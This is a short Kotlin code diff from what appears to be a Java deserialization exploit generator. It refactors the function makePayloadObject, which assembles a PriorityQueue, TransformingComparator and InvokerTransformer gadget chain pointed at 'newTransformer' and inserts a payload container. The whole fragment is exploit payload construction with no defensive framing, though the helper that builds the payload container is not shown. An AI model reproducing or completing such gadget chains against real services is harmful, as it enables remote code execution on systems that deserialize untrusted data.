@@ -33,9 +33,7 @@ fun makePayloadObject(): Any {
     val queue = PriorityQueue(2, TransformingComparator(transformer))
     queue.add(42)
     queue.add(42)
-    InvokerTransformer::class.java.getDeclaredField("iMethodName").apply {
-        isAccessible = true
-    }.set(transformer, "newTransformer")
+    transformer.unsafeSetObjectField("iMethodName", "newTransformer")
     val objs = queue.unsafeGetObjectField<Array<Any?>>("queue")
     objs[0] = makePayloadContainer()
     return queue
